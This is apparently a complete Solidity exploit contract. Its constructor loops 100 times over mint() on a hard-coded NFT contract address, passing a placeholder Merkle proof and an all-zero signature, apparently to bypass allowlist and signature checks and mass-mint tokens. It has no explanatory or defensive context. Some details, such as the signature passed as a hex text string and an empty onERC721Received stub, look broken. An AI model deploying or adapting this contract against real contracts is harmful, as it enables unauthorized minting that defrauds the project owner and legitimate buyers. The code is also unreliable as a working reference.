// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.22;

interface INFT {
    function mint(
        uint32 qty,
        bytes32[] calldata proof,
        uint64 timestamp,
        bytes calldata signature
    ) external payable;

    function contractURI() external view returns (string memory);

    function owner() external view returns (address);
}

contract TT {
    constructor() payable {
        INFT NFT = INFT(0x2A0c44ACe671744EDC884EA182Bea52cebAc5431);
        bytes32[] memory null_bytes = new bytes32[](1);
        for (uint i = 0; i < 100; i++) {
            NFT.mint{value: 1 ether}(
                3,
                null_bytes,
                uint64(block.timestamp),
                "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
            );
        }
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {}
}
